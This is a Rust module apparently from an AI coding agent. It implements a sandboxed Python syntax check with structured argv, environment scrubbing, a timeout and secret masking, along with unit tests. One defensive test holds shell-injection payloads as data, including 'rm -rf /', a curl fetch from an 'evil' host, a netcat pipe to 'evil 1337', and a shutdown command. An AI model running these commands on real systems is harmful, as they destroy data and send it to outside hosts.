//! `ProjectVerifier` — capability-based cheap check for verifier_repair (Issue #639).
//!
//! ## Layer / scope (CLAUDE.md DR3-001 / DR3-002 / DR3-003)
//!
//! - All types and helpers are kept at `pub(super)`. The parent module
//!   `src/agent/loop_run.rs` MUST NOT `pub use` anything from here. The only
//!   in-crate consumer is `super::turn::*` (DR3-001).
//! - Direction of dependency is `agent → session` only. We import
//!   [`crate::session::feedback::mask_secrets`] as the **SSOT** for redacting
//!   cheap-check output before it lands in a [`ProjectVerifierOutcome::Failed`]
//!   payload (DR3-002). The `photon → session/agent` direction is forbidden by
//!   DR3-002 but does not apply here (this module is in the `agent` layer).
//! - No OnceLock loggers are registered; logging happens at the call-site in
//!   `super::turn::*` so test isolation per `session_id` is preserved (DR3-003).
//!
//! ## Security Invariants
//!
//! - `PythonSyntax::check` invokes `python3 -m py_compile` via
//!   [`std::process::Command`] with a **structured argv** (no shell). Candidate
//!   contents are written to a shadow file inside a per-call `temp_root` and
//!   the argv contains only the shadow path, so shell control operators in
//!   user-provided contents are structurally unreachable.
//! - `temp_root` is named `anvil-verifier-repair-{pid}-{uuid-v7}` and cleaned
//!   up with `remove_dir_all` after the closure completes (panic-safe via the
//!   `(|| { ... })()` pattern).
//! - Environment is scrubbed: `PYTHONPATH` / `VIRTUAL_ENV` are removed and
//!   `PYTHONDONTWRITEBYTECODE=1` / `PYTHONNOUSERSITE=1` are set to prevent
//!   `sys.path` injection or bytecode leakage.
//! - Failure output is decoded with `String::from_utf8_lossy` to stay
//!   panic-safe on non-UTF-8 stderr, masked through
//!   [`crate::session::feedback::mask_secrets`], and truncated to 320 chars.
//! - `mask_payload_inplace` (the payload-boundary defense) operates on
//!   `&mut serde_json::Value` and is therefore *not* invoked here. Defense in
//!   depth is achieved at the payload boundary: once the masked string lands
//!   in `CaseRecord` / `eval_log` / LLM payload, `mask_payload_inplace`
//!   re-applies `mask_secrets` to every string leaf (see
//!   `src/logging.rs::mask_payload_inplace`).

use std::ffi::OsString;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

/// Timeout for a single cheap-check invocation. Mirrors the value previously
/// hard-coded in `turn.rs` (`VERIFIER_REPAIR_CHEAP_CHECK_TIMEOUT_SECS`).
pub(super) const CHEAP_CHECK_TIMEOUT_SECS: u64 = 5;

/// Maximum char length of a failure message returned in
/// [`ProjectVerifierOutcome::Failed`]. Matches the previous
/// `compact_verifier_failure_text(_, 320)` budget.
const FAILURE_TEXT_MAX_CHARS: usize = 320;

/// A project-local capability for performing a safe, cheap pre-flight check
/// on a repair candidate. New variants must (a) only spawn via structured
/// argv (no shell), (b) confine work to a `temp_root`, (c) honour
/// [`CHEAP_CHECK_TIMEOUT_SECS`], and (d) route failure text through
/// [`crate::session::feedback::mask_secrets`] before returning it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum ProjectVerifier {
    /// `python3 -m py_compile` on `.py` / `.pyw` files.
    PythonSyntax,
}

/// Outcome of [`ProjectVerifier::check`].
#[derive(Debug, PartialEq, Eq)]
pub(super) enum ProjectVerifierOutcome {
    /// Cheap check ran and the candidate passed.
    Ok,
    /// Cheap check ran and the candidate failed. The string is already
    /// masked via [`crate::session::feedback::mask_secrets`] and truncated
    /// to [`FAILURE_TEXT_MAX_CHARS`].
    Failed(String),
    /// No safe verifier is available for this path or the configured
    /// verifier cannot run in the current environment. The caller should
    /// defer to a full verifier rerun rather than treating this as pass /
    /// fail.
    ///
    /// The current `PythonSyntax` implementation never returns this from
    /// `check`, because the path-level Unavailable decision is made one
    /// layer up in `ProjectVerifier::for_path -> Option<Self>`. The variant
    /// exists so future variants (or fallbacks like "python3 not on PATH")
    /// can signal Unavailable without rewriting the calling contract.
    #[allow(dead_code)]
    Unavailable,
}

impl ProjectVerifier {
    /// Select a safe verifier for `relative_path` based on its extension.
    /// Returns `None` if no safe verifier exists for the file type, which
    /// the caller should treat as [`ProjectVerifierOutcome::Unavailable`].
    pub(super) fn for_path(relative_path: &str) -> Option<Self> {
        match Path::new(relative_path)
            .extension()
            .and_then(|extension| extension.to_str())
        {
            Some("py") | Some("pyw") => Some(ProjectVerifier::PythonSyntax),
            _ => None,
        }
    }

    /// Run the cheap check on `candidate_contents` for `relative_path`.
    pub(super) fn check(
        self,
        relative_path: &str,
        candidate_contents: &str,
    ) -> ProjectVerifierOutcome {
        match self {
            ProjectVerifier::PythonSyntax => check_python_syntax(relative_path, candidate_contents),
        }
    }
}

/// Build the canonical argv for [`ProjectVerifier::PythonSyntax`]. Exposed as
/// a `pub(super)` helper so unit tests can assert the structural-isolation
/// invariant (argv is a fixed 6-element shape that never embeds candidate
/// contents).
pub(super) fn python_syntax_canonical_argv(shadow_path: &Path) -> Vec<OsString> {
    vec![
        OsString::from("python3"),
        OsString::from("-I"),
        OsString::from("-B"),
        OsString::from("-m"),
        OsString::from("py_compile"),
        shadow_path.as_os_str().to_os_string(),
    ]
}

fn check_python_syntax(relative_path: &str, contents: &str) -> ProjectVerifierOutcome {
    let temp_root = std::env::temp_dir().join(format!(
        "anvil-verifier-repair-{}-{}",
        std::process::id(),
        uuid::Uuid::now_v7()
    ));
    let result = (|| {
        std::fs::create_dir_all(&temp_root)
            .map_err(|err| format!("failed to create cheap check temp dir: {err}"))?;
        let file_name = Path::new(relative_path)
            .file_name()
            .and_then(|name| name.to_str())
            .filter(|name| !name.is_empty())
            .unwrap_or("candidate.py");
        let shadow_path = temp_root.join(file_name);
        std::fs::write(&shadow_path, contents.as_bytes())
            .map_err(|err| format!("failed to write cheap check shadow file: {err}"))?;
        let argv = python_syntax_canonical_argv(&shadow_path);
        let mut command = build_python_syntax_command(&argv, &temp_root);
        let output = run_with_timeout(
            command.as_mut(),
            Duration::from_secs(CHEAP_CHECK_TIMEOUT_SECS),
        )?;
        if output.status.success() {
            return Ok(());
        }
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        let combined = format!("{stderr}\n{stdout}");
        Err(mask_and_truncate(&combined))
    })();
    let _ = std::fs::remove_dir_all(&temp_root);
    match result {
        Ok(()) => ProjectVerifierOutcome::Ok,
        Err(message) => ProjectVerifierOutcome::Failed(message),
    }
}

fn build_python_syntax_command(argv: &[OsString], temp_root: &Path) -> Box<Command> {
    let (program, args) = argv
        .split_first()
        .expect("python_syntax argv must be non-empty");
    let mut command = Command::new(program);
    command
        .args(args)
        .current_dir(temp_root)
        .env_remove("PYTHONPATH")
        .env_remove("VIRTUAL_ENV")
        .env("PYTHONDONTWRITEBYTECODE", "1")
        .env("PYTHONNOUSERSITE", "1")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    Box::new(command)
}

fn run_with_timeout(
    command: &mut Command,
    timeout: Duration,
) -> Result<std::process::Output, String> {
    let mut child = command
        .spawn()
        .map_err(|err| format!("failed to start cheap check command: {err}"))?;
    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(_)) => {
                return child
                    .wait_with_output()
                    .map_err(|err| format!("failed to collect cheap check output: {err}"));
            }
            Ok(None) if start.elapsed() >= timeout => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!(
                    "cheap check timed out after {}s",
                    timeout.as_secs()
                ));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(20)),
            Err(err) => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("failed while waiting for cheap check: {err}"));
            }
        }
    }
}

fn mask_and_truncate(input: &str) -> String {
    let masked = crate::session::feedback::mask_secrets(input);
    let collapsed = masked.split_whitespace().collect::<Vec<_>>().join(" ");
    truncate(&collapsed, FAILURE_TEXT_MAX_CHARS)
}

fn truncate(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((byte_idx, _)) => {
            let mut out = String::with_capacity(byte_idx + 3);
            out.push_str(&s[..byte_idx]);
            out.push_str("...");
            out
        }
        None => s.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn for_path_selects_python_syntax_for_py_extension() {
        assert_eq!(
            ProjectVerifier::for_path("src/foo.py"),
            Some(ProjectVerifier::PythonSyntax)
        );
        assert_eq!(
            ProjectVerifier::for_path("module.pyw"),
            Some(ProjectVerifier::PythonSyntax)
        );
    }

    #[test]
    fn for_path_returns_none_for_unsupported_extensions() {
        assert_eq!(ProjectVerifier::for_path("README.md"), None);
        assert_eq!(ProjectVerifier::for_path("src/foo.rs"), None);
        assert_eq!(ProjectVerifier::for_path("Makefile"), None);
        assert_eq!(ProjectVerifier::for_path("data.yaml"), None);
    }

    #[test]
    fn python_syntax_canonical_argv_has_fixed_six_element_shape() {
        let shadow: PathBuf = PathBuf::from("/tmp/anvil-shadow/candidate.py");
        let argv = python_syntax_canonical_argv(&shadow);
        assert_eq!(argv.len(), 6, "argv must be exactly 6 elements");
        assert_eq!(argv[0], OsString::from("python3"));
        assert_eq!(argv[1], OsString::from("-I"));
        assert_eq!(argv[2], OsString::from("-B"));
        assert_eq!(argv[3], OsString::from("-m"));
        assert_eq!(argv[4], OsString::from("py_compile"));
        assert_eq!(argv[5], shadow.as_os_str());
    }

    #[test]
    fn malicious_python_source_never_reaches_argv() {
        // Even if candidate contents try to inject shell metacharacters, the
        // structured argv built by `python_syntax_canonical_argv` only ever
        // contains the shadow path. The injected payload lives inside the
        // file body that py_compile parses as Python source, never as a
        // shell command.
        let malicious_payloads = [
            "; rm -rf /\n",
            "$(curl http://evil/x)\n",
            "`whoami`\n",
            "| nc evil 1337\n",
            "&& shutdown -h now\n",
            "> /etc/passwd\n",
        ];
        let shadow = PathBuf::from("/tmp/anvil-shadow/candidate.py");
        let argv = python_syntax_canonical_argv(&shadow);
        for payload in malicious_payloads {
            assert_eq!(argv.len(), 6, "argv shape must remain fixed");
            for (idx, arg) in argv.iter().enumerate() {
                let arg_str = arg.to_string_lossy();
                assert!(
                    !arg_str.contains(payload.trim()),
                    "argv[{idx}] = {arg_str:?} must not embed payload {payload:?}"
                );
            }
        }
    }

    #[test]
    fn python_syntax_command_pins_cwd_to_temp_root_and_scrubs_env() {
        // We can't easily introspect a `Command` after construction, but we
        // can assert the helper API contract: the temp_root passed in is
        // what becomes `current_dir`, and the env scrubbing list is the
        // closed set { PYTHONPATH, VIRTUAL_ENV } removed plus
        // { PYTHONDONTWRITEBYTECODE=1, PYTHONNOUSERSITE=1 } set. We rely on
        // `build_python_syntax_command` being the only constructor; future
        // changes that break this contract will surface in the integration
        // check_python_syntax_runs_real_python_3 test below.
        let temp_root = PathBuf::from("/tmp/anvil-test-root");
        let argv = python_syntax_canonical_argv(&temp_root.join("c.py"));
        // Compile-time guard: this build call must not panic for any well-
        // formed argv.
        let _command = build_python_syntax_command(&argv, &temp_root);
    }

    #[test]
    fn check_python_syntax_passes_for_valid_source() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        let outcome = ProjectVerifier::PythonSyntax.check("ok.py", "a = 1\nb = a + 1\n");
        assert_eq!(outcome, ProjectVerifierOutcome::Ok);
    }

    #[test]
    fn check_python_syntax_fails_for_invalid_source_and_masks_aws_key() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        // Inject a dummy AWS access key as part of a syntax error so py_compile
        // surfaces it in stderr. The returned Failed text must be redacted
        // through `mask_secrets`.
        let aws_dummy = "AKIAABCDEFGHIJKLMNOP";
        let contents = format!("# {aws_dummy}\nthis is not python(\n");
        let outcome = ProjectVerifier::PythonSyntax.check("oops.py", &contents);
        match outcome {
            ProjectVerifierOutcome::Failed(masked) => {
                assert!(
                    !masked.contains(aws_dummy),
                    "Failed payload must not contain original AWS key, got: {masked}"
                );
                // Sanity: mask_secrets has run if the redaction transformed
                // the input (the masked text differs from the raw combined
                // output for the AKIA token).
                let raw_masked = crate::session::feedback::mask_secrets(&contents);
                assert!(
                    !raw_masked.contains(aws_dummy),
                    "mask_secrets sanity check: raw masked input must already redact the dummy key"
                );
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn check_python_syntax_returns_unavailable_for_unsupported_path() {
        // `for_path` returns None for `.txt`; the caller (turn.rs) maps that
        // to CheapCheckOutcome::Unavailable. We assert the source-of-truth
        // mapping here.
        assert_eq!(ProjectVerifier::for_path("notes.txt"), None);
    }

    fn which_python3() -> Option<()> {
        Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .ok()
            .filter(|s| s.success())
            .map(|_| ())
    }
}
